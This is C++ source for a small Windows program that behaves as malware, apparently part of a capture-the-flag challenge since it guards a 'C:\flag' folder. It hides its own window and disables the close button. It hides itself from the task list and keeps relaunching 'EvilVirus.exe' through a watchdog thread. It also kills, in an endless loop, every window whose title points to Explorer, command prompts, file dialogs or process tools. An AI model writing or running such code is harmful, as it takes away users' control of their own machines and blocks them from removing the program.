//by Kopeicev

#include "Windows.h"

typedef void (WINAPI *FUNC)(int, int);

BOOL CALLBACK hideWindow(HWND handle, LPARAM myPid)
{
	char* buf = new char[260];
	memset(buf, 0, 260);
	::GetWindowText(handle, buf, 260);
	if (strcmp(buf, "killer") != 0)
	{
		delete [] buf;
		return TRUE;
	}

	HMENU mn = ::GetSystemMenu(handle, FALSE);
	::EnableMenuItem(mn, SC_CLOSE, MF_DISABLED);

	::ShowWindow(handle, SW_MINIMIZE);
	::ShowWindow(handle, SW_HIDE);
	
	delete [] buf;
	return FALSE;
}

DWORD WINAPI watchDog()
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

	while(TRUE)
	{
		::Sleep(5000);
		if (::FindWindow(NULL, "HAHAHA!!!") != NULL)
			continue;
		
		if (::FindWindow(NULL, "EvilVirus") != NULL)
			continue;

	    memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		memset(&pi, 0, sizeof(pi));
		::CreateProcessA("C:\\flag\\EvilVirus.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	}

	return 0;
}

BOOL CALLBACK payloadKill(HWND handle, LPARAM myPid)
{
	DWORD procId = 0;
	char* buf = new char[260];
	memset(buf, 0, 260);
	::GetWindowText(handle, buf, 260);
	STARTUPINFO si;
        PROCESS_INFORMATION pi;

	if ((strstr(buf, "Find:") != 0) || (strstr(buf, "flag") != 0) || (strstr(buf, "C:") != 0))
	{
		::GetWindowThreadProcessId(handle, &procId);
		::TerminateProcess(::OpenProcess(PROCESS_ALL_ACCESS, TRUE, procId), 0);
		
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		memset(&pi, 0, sizeof(pi));
		::CreateProcessA("C:\\Windows\\Explorer.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	}
	else if ((strstr(buf, "Prompt") != 0) || (strstr(buf, "Open") != 0) || (strstr(buf, "Process") != 0))
	{
	        ::GetWindowThreadProcessId(handle, &procId);
	        ::TerminateProcess(::OpenProcess(PROCESS_ALL_ACCESS, TRUE, procId), 0);
	}
	
	delete [] buf;
	return TRUE;
}

void simpleHack()
{
	FUNC func = (FUNC) ::GetProcAddress(::GetModuleHandle("KERNEL32"), "RegisterServiceProcess");
	func(0, 1);
}

int main()
{
	simpleHack();
	::EnumWindows((WNDENUMPROC) &hideWindow, NULL);
	DWORD tid = 0;
	::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) &watchDog, NULL, 0, &tid);
	while(TRUE)
		::EnumWindows((WNDENUMPROC) &payloadKill, NULL);

	return 0;
}
/*-----EoF-----*/